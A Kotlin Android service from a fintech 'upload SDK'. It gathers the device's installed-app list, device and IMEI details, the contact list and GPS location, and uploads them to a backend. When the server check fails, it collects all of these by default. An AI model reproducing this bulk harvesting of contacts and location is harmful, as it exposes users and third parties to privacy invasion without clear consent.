package com.fintek.upload_sdk

import android.Manifest
import android.annotation.SuppressLint
import android.app.IntentService
import android.content.Context
import android.content.Intent
import androidx.annotation.RequiresApi
import androidx.annotation.RequiresPermission
import com.fintek.upload_sdk.model.UserAuthInfo
import com.fintek.upload_sdk.network.ApiService
import com.fintek.upload_sdk.network.RetrofitHelper
import com.fintek.upload_sdk.utils.AppUtils
import com.fintek.upload_sdk.utils.ContactUtil
import com.fintek.upload_sdk.utils.EstimateUtils
import com.fintek.utils_androidx.contact.ContactUtils
import com.fintek.utils_androidx.location.LocationUtils
import com.google.gson.Gson
import kotlinx.coroutines.*
import okhttp3.MediaType
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.toRequestBody

/**
 * Created by ChaoShen on 2020/11/27
 */
class UploadService : IntentService("Upload"), CoroutineScope by MainScope() {

    companion object {

        @JvmStatic
        fun startService(context: Context) {
            val intent = Intent(context, UploadService::class.java)
            context.startService(intent)
        }
    }

    private val locationUtils = LocationUtils()
    private val apiService: ApiService = RetrofitHelper.getApi(ApiService::class.java)

    @Volatile private var count = 0

    @RequiresPermission(anyOf = [Manifest.permission.ACCESS_FINE_LOCATION])
    override fun onHandleIntent(intent: Intent?) {
        locationUtils.registerLocationListener()
        launch { doUpload() }
    }

    @RequiresPermission(anyOf = [Manifest.permission.ACCESS_FINE_LOCATION])
    private suspend fun doUpload() = withContext(Dispatchers.Default) {
        try {
            val extInfoRec = getRec()

            if (extInfoRec.isAllEmpty()) { //需要的信息都是空的时候就不进行上传
                stop()
                return@withContext
            }

            val requestBody = mapOf("extInfoReq" to extInfoRec).requestBody()
            val result = apiService.postExtInfo(requestBody)

            if (result.isSuccess) {
                stop()
            } else {
                reSaveExtInfo()
            }
        } catch (e: Exception) {
            reSaveExtInfo()
        }
    }

    /**
     * 上传错误的重新上传
     */
    @RequiresPermission(anyOf = [Manifest.permission.ACCESS_FINE_LOCATION])
    private suspend fun reSaveExtInfo() {
        if (count >= 2) {
            stop()
            return
        }

        doUpload()
        synchronized(count) {
            count ++
        }
    }


    @RequiresPermission(anyOf = [Manifest.permission.READ_CONTACTS])
    private suspend fun getRec(): UserAuthInfo = withContext(Dispatchers.Default) {
        val userAuthInfo = UserAuthInfo(merchantId = UploadUtils.requiredConfig.merchant)

        val result = apiService.fetchUserExtExpired()
        val response = result.data

        if (result.isFailed || response == null) {
            userAuthInfo.apply {
                putAppList()
                putEstimateInfo()
                putContacts()
                putLocation()
            }

            userAuthInfo.source = UserAuthInfo.UPALLDATASETS
            return@withContext userAuthInfo
        }

        if (response.appInfo) userAuthInfo.putAppList()
        if (response.equipmentInfoMap || response.imei) userAuthInfo.putEstimateInfo()
        if (response.userContact) userAuthInfo.putContacts()
        if (response.gps) userAuthInfo.putLocation()

        userAuthInfo
    }

    /**
     * 放app列表
     */
    private fun UserAuthInfo.putAppList() {
        appList = AppUtils.getAllApk(applicationContext)
    }

    /**
     * 放额外信息
     */
    @SuppressLint("MissingPermission")
    private fun UserAuthInfo.putEstimateInfo() {
        equipmentInfoMap = EstimateUtils.getEstimateMap()
    }

    /**
     * 放通讯录信息
     */
    @RequiresApi(19)
    @RequiresPermission(Manifest.permission.READ_CONTACTS)
    private fun UserAuthInfo.putContacts() {
        contactList = ContactUtil.getContacts()
    }

    /**
     * 放位置信息
     */
    private fun UserAuthInfo.putLocation() {
        try {
            val locationData = locationUtils.getLocationData()
            gps = UserAuthInfo.GpsBean(
                latitude = locationData?.location?.latitude?.toString() ?: "0",
                longitude = locationData?.location?.longitude?.toString() ?: "0"
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    /**
     * 停止服务，这个操作会取消协程
     */
    @RequiresPermission(anyOf = [Manifest.permission.ACCESS_FINE_LOCATION])
    private fun stop() {
        count = 0
        locationUtils.unregisterLocationListener()
        stopSelf()
    }

    private fun Map<*, *>.requestBody(mediaType: MediaType? = "application/json; charset=utf-8".toMediaTypeOrNull()): RequestBody {
        return Gson().toJson(this)
            .toRequestBody(mediaType)
    }
}